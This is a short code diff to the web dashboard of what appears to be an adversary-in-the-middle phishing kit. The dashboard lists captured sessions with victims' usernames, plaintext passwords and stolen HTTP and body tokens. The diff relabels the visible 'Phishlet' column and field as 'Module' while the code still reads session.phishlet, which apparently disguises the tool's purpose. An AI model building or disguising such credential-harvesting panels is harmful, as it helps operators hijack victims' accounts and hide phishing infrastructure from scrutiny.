@@ -231,7 +231,7 @@
                             <th>Session ID</th>
                             <th>Update Time</th>
                             <th>Username</th>
-                            <th>Phishlet</th>
+                            <th>Module</th>
                             <th>Tokens</th>
                             <th>HTTP Tokens</th>
                             <th>Body Tokens</th>
@@ -328,7 +328,7 @@
             html += `<div style="margin-top: 10px; color: rgba(255,255,255,0.8);">Session ID: ${session.id}</div>`;
             html += `<div style="color: rgba(255,255,255,0.8);">Username: ${session.username || 'N/A'}</div>`;
             html += `<div style="color: rgba(255,255,255,0.8);">Password: ${session.password || 'N/A'}</div>`;
-            html += `<div style="color: rgba(255,255,255,0.8);">Phishlet: ${session.phishlet || 'N/A'}</div>`;
+            html += `<div style="color: rgba(255,255,255,0.8);">Module: ${session.phishlet || 'N/A'}</div>`;
             
             // Render tokens
             if (session.tokens_detail && Object.keys(session.tokens_detail).length > 0) {
